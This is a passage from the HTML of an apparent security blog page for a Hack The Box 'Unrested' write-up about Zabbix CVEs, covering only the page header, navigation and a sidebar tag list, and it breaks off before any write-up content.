<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>【CVE machines】 htb Unrested wp | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="机器介绍123456789Unrested is a medium difficulty &#96;Linux&#96; machine hosting a version of &#96;Zabbix&#96;. Enumerating the version of &#96;Zabbix&#96; shows that it is vulnerable to both [CVE-2024-36467](https:&#x2F;&#x2F;nvd.nist.go">
<meta property="og:type" content="article">
<meta property="og:title" content="【CVE machines】 htb Unrested wp">
<meta property="og:url" content="http://example.com/2024/12/14/box-wp-Unrested/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="机器介绍123456789Unrested is a medium difficulty &#96;Linux&#96; machine hosting a version of &#96;Zabbix&#96;. Enumerating the version of &#96;Zabbix&#96; shows that it is vulnerable to both [CVE-2024-36467](https:&#x2F;&#x2F;nvd.nist.go">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/Unrested/background.jpg">
<meta property="article:published_time" content="2024-12-14T08:30:39.000Z">
<meta property="article:modified_time" content="2024-12-16T11:37:08.400Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="SQL injection">
<meta property="article:tag" content="Zabbix">
<meta property="article:tag" content="CVE-2024-36467">
<meta property="article:tag" content="CVE-2024-42327">
<meta property="article:tag" content="Nmap">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/Unrested/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<script>



</script>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">13</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-8/">
                htb-Season-8
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">10</div>
            </a>
        <div class="children"><div class="category-box">
            <a class="category-link" href="/categories/ctf/wiz/">
                wiz
                <div class="category-count">2</div>
            </a>
        </div></div>
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ADCS/" rel="tag">ADCS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Below/" rel="tag">Below</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CI-CD/" rel="tag">CI&#x2F;CD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2022-29623/" rel="tag">CVE-2022-29623</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CreateChild/" rel="tag">CreateChild</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Dacl/" rel="tag">Dacl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Ntlmv1/" rel="tag">Ntlmv1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKI-ADMIN/" rel="tag">PKI ADMIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pyside2/" rel="tag">Pyside2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rogue-potato/" rel="tag">Rogue potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube/" rel="tag">Roundcube</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Self/" rel="tag">Self</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TeamCity/" rel="tag">TeamCity</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tombstone/" rel="tag">Tombstone</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/apache/" rel="tag">apache</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure/" rel="tag">azure</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc15/" rel="tag">esc15</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ipv6/" rel="tag">ipv6</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mysqljs/" rel="tag">mysqljs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/owa/" rel="tag">owa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pdf/" rel="tag">pdf</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pinns/" rel="tag">pinns</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgres/" rel="tag">postgres</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a 